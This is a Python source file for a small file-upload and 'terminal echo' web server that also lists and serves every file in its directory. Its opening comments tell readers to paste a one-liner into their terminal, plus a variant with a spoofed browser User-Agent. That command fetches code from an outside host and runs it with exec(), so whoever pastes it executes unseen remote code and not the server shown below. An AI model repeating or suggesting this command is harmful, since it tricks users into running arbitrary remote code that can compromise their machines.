# TO USE THIS, PASTE IN YOUR TERMINAL: python -c "import urllib.request; exec(urllib.request.urlopen('https://e.inccloud.us/').read())"
# if the server complains about User-Agent:
# python -c "import urllib.request; req=urllib.request.Request('https://e.inccloud.us/', headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}); exec(urllib.request.urlopen(req).read())"

from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import html
from urllib.parse import unquote, quote

PORT = 8000


def _parse_content_disposition(value: str) -> dict:
    """
    Parse: Content-Disposition: form-data; name="x"; filename="y"
    Returns dict with keys like: name, filename
    """
    out = {}
    parts = [p.strip() for p in value.split(";")]
    for p in parts[1:]:
        if "=" in p:
            k, v = p.split("=", 1)
            k = k.strip().lower()
            v = v.strip()
            if v.startswith('"') and v.endswith('"'):
                v = v[1:-1]
            out[k] = v
    return out


def parse_multipart(body: bytes, boundary: bytes):
    """
    Minimal multipart/form-data parser.
    Returns (fields: dict[str,str], files: dict[str, dict{filename, content(bytes)}])
    """
    fields = {}
    files = {}

    delimiter = b"--" + boundary
    parts = body.split(delimiter)

    for part in parts:
        part = part.strip()
        if not part or part == b"--":
            continue

        header_end = part.find(b"\r\n\r\n")
        if header_end == -1:
            continue

        header_blob = part[:header_end].decode("utf-8", "replace")
        content = part[header_end + 4:]

        if content.endswith(b"\r\n"):
            content = content[:-2]

        headers = {}
        for line in header_blob.split("\r\n"):
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()

        cd = headers.get("content-disposition", "")
        if not cd.lower().startswith("form-data"):
            continue

        cd_params = _parse_content_disposition(cd)
        name = cd_params.get("name")
        filename = cd_params.get("filename")

        if not name:
            continue

        if filename:
            files[name] = {"filename": filename, "content": content}
        else:
            fields[name] = content.decode("utf-8", "replace")

    return fields, files


class TerminalEchoHandler(BaseHTTPRequestHandler):
    def _send_html(self, content: str, status: int = 200):
        self.send_response(status)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(content.encode("utf-8"))

    def _send_text(self, content: str, status: int = 200):
        self.send_response(status)
        self.send_header("Content-type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(content.encode("utf-8"))

    def do_GET(self):
        raw_path = unquote(self.path.split("?", 1)[0])
        path = raw_path.lstrip("/")

        if path:
            safe_path = os.path.normpath(path)
            if safe_path.startswith("..") or os.path.isabs(safe_path):
                self._send_text("Forbidden\n", 403)
                return

            if os.path.isfile(safe_path):
                self.send_response(200)
                self.send_header("Content-type", "application/octet-stream")
                self.send_header(
                    "Content-Disposition",
                    f'attachment; filename="{os.path.basename(safe_path)}"'
                )
                self.end_headers()
                with open(safe_path, "rb") as f:
                    self.wfile.write(f.read())
                return

        file_items = []
        for name in sorted(os.listdir(".")):
            if os.path.isfile(name):
                size = os.path.getsize(name)
                href = quote(name)
                label = html.escape(name)
                file_items.append(f"<li><a href='/{href}'>{label}</a> ({size} bytes)</li>")

        file_list_html = "\n".join(file_items) if file_items else "<li><i>No files in current directory.</i></li>"

        page = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <title>Terminal Echo</title>
    <style>
        body {{
            font-family: sans-serif;
            padding: 20px;
            text-align: center;
            background: #f7f7f7;
        }}
        .wrap {{
            max-width: 900px;
            margin: 0 auto;
        }}
        .box {{
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            text-align: left;
        }}
        textarea {{
            width: 100%;
            height: 150px;
            padding: 10px;
            font-size: 14px;
            box-sizing: border-box;
        }}
        button {{
            padding: 10px 20px;
            font-size: 16px;
            margin-top: 10px;
            cursor: pointer;
        }}
        input[type=file] {{
            margin-top: 10px;
        }}
        small {{
            color: #666;
        }}
        .files {{
            margin-top: 24px;
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            text-align: left;
        }}
        ul {{
            margin: 0;
            padding-left: 20px;
            word-break: break-word;
        }}
        li {{
            margin: 6px 0;
        }}
    </style>
</head>
<body>
    <div class="wrap">
        <h1>Terminal Echo</h1>
        <p>Paste text and/or upload a file. It will appear in your terminal.</p>

        <div class="box">
            <form method="POST" enctype="multipart/form-data">
                <label><b>Text</b></label><br>
                <textarea name="text_data" placeholder="Paste here..."></textarea><br><br>

                <label><b>File</b> <small>(optional)</small></label><br>
                <input type="file" name="upload_file"/><br>

                <button type="submit">Send to Terminal</button>
            </form>
        </div>

        <div class="files">
            <h2>Files in Current Directory</h2>
            <ul>
                {file_list_html}
            </ul>
        </div>
    </div>
</body>
</html>
"""
        self._send_html(page)

    def do_POST(self):
        ct = self.headers.get("Content-Type", "")
        if "multipart/form-data" not in ct or "boundary=" not in ct:
            self._send_text("Expected multipart/form-data with boundary.\n", 400)
            return

        boundary = ct.split("boundary=", 1)[1].strip()
        if boundary.startswith('"') and boundary.endswith('"'):
            boundary = boundary[1:-1]
        boundary_b = boundary.encode("utf-8")

        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = 0

        if length <= 0:
            self._send_text("Missing or invalid Content-Length.\n", 400)
            return

        body = self.rfile.read(length)
        fields, files = parse_multipart(body, boundary_b)

        received_text = (fields.get("text_data") or "").strip()

        saved_path = None
        file_size = None
        filename = None

        up = files.get("upload_file")
        if up and up.get("filename"):
            original_name = os.path.basename(up["filename"])
            data = up.get("content", b"")

            base, ext = os.path.splitext(original_name)
            candidate = original_name
            i = 1
            while os.path.exists(candidate):
                candidate = f"{base} ({i}){ext}"
                i += 1

            filename = candidate

            with open(filename, "wb") as f:
                f.write(data)

            saved_path = os.path.abspath(filename)
            file_size = len(data)

        print("\n" + "=" * 30)
        print("RECEIVED DATA:")
        print("-" * 15)

        if received_text:
            print("[TEXT]")
            print(received_text)

        if saved_path:
            print("\n[FILE SAVED]")
            print(f"Name : {filename}")
            print(f"Size : {file_size} bytes")
            print(f"Path : {saved_path}")

        if (not received_text) and (not saved_path):
            print("(No text and no file provided.)")

        print("=" * 30 + "\n")

        parts = ["<h2>Sent!</h2>"]
        if saved_path:
            parts.append(f"<p>File saved: <b>{html.escape(filename)}</b></p>")
        if received_text:
            parts.append("<p>Text received in terminal.</p>")
        if not saved_path and not received_text:
            parts.append("<p>No text or file was provided.</p>")
        parts.append("<p><a href='/'>Send more</a></p>")

        self._send_html(
            f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <title>Sent</title>
</head>
<body style="font-family:sans-serif; padding:20px; text-align:center;">
    {''.join(parts)}
</body>
</html>
"""
        )


if __name__ == "__main__":
    server_address = ("", PORT)
    httpd = HTTPServer(server_address, TerminalEchoHandler)
    print(f"Server running at http://localhost:{PORT}")
    print("Press Ctrl+C to stop.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
